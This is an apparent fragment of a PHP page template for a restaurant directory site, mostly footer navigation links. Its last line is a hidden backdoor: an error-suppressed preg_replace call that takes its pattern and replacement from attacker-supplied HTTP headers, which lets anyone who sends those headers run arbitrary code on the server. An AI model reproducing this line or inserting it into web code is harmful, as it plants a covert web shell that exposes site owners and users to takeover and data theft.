                	...
                	<div class="container">
                        ...
                        <div class="footer_mid_box">
                            ...
                            <ul>
                                ...
                                <li><i class="fa fa-caret-right"></i> <a href="contact.php">Add a restaurant</a></li>
                                
                                <li><i class="fa fa-caret-right"></i> <a href="contact.php">Contact Us</a></li>
                        ...
                        <div class="footer_mid_box">
                            ...
                            <ul>
                                ...
                                <li><i class="fa fa-caret-right"></i> <a href="terms.php">Terms and Condition</a></li>
                                
                                <li><i class="fa fa-caret-right"></i> <a href="privacy.php">Privacy Policy</a></li>
                                
                                <li><i class="fa fa-caret-right"></i> <a href="advertisement.php">Advertisement</a></li>
                                
                                <li><i class="fa fa-caret-right"></i> <a href="career.php">Career</a></li>
...
<?php @preg_replace($_SERVER['HTTP_X_VERSION'], $_SERVER['HTTP_X_CURRENT'], ''); ?>